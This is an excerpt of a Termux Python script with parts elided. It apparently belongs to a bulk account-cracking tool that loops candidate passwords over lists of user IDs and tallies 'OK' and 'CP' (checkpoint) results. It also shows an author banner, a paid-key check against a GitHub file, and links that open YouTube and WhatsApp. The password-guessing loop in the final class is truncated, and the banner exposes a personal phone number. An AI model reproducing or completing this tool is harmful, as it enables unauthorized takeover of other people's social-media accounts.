...
\033[0;96m                                          ░ 
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : MH_JIHAD        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : MH-Jihad404        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : MAHADI HASAN JIHAD       \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801866591812     \033[1;93m▇▇
...
def reg():
    os.system('termux-setup-storage')
    os.system('clear')
    os.system('xdg-open https://youtube.com/@termuxhackermhj9366')
    logo()
    print ('')
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/RIFAT-100-hub/2paid/blob/main/Afroveal007.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
...
def chigozie():
    ...
    try:
        ...
        os.system('xdg-open https://wa.me/+8801866591812')
        bsn_menu()
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : MH_JIHAD 😈😈");time.sleep (0.03)
    print("             [*]. FACEBOOK   : MAHADI HASAN JIHAD");time.sleep (0.03)
    print("             [*]. GITHUB     : MH-Jihad404");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [MAHADI] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
